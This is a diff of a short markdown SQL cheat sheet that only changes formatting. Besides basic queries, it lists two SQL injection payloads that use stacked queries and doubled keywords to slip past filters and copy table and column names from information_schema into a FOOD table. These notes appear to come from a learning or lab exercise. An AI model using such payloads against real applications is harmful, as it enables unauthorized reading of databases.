@@ -21,11 +21,11 @@ SHOW TABLES;
 -  __Filter by type__  -  SELECT * FROM FOOD WHERE TYPE = 'Meat';
 -  __Delete a row__  -  DELETE FROM FOOD WHERE NAME = 'Tuna';
 
-SQL INJECTION TO GRAB INFOMATION FROM ANOTHER TABLE.
+**SQL INJECTION TO GRAB INFOMATION FROM ANOTHER TABLE.**
 
-1;UPDATE FOOD SET Name=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));
+-  1;UPDATE FOOD SET Name=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));
 
-1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='tools'));
+-  1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='tools'));
 
 (*) -> wildcard selector (all fields / columns)
 (;) -> statement terminator
